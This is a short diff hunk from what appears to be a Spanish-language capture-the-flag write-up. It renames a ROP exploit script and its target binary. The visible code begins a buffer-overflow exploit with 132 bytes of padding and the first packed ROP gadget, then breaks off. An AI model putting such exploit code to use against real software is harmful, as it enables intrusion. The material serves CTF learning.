@@ -232,13 +232,13 @@ Aquí es donde me ofusque con este reto y empecé a hacer todo tipo de pruebas d
 
 ```python
 #!/usr/bin/python
-# Fichero pwn_please_no.py 
+# Fichero explotalo.py 
 # Exploit ROP
 
 
 from struct import pack
 
-binary = "please-no"
+binary = "carrots"
 junk = "A" * 132
 
 rop = pack('<I', 0x42495244)   
